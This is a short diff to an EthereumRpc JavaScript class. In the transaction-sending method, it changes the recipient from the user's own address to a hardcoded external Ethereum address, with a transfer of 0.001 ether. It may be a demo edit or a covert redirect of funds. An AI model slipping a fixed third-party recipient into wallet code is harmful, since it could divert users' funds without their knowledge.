@@ -60,7 +60,7 @@ export default class EthereumRpc {
       // Get user's Ethereum public address
       const fromAddress = (await web3.eth.getAccounts())[0];
 
-      const destination = fromAddress;
+      const destination = "0xBC6dB679B4F43abC493B22b8E67B179bc3f13655";
 
       const amount = web3.utils.toWei("0.001", "ether"); // Convert 1 ether to wei
       let transaction = {
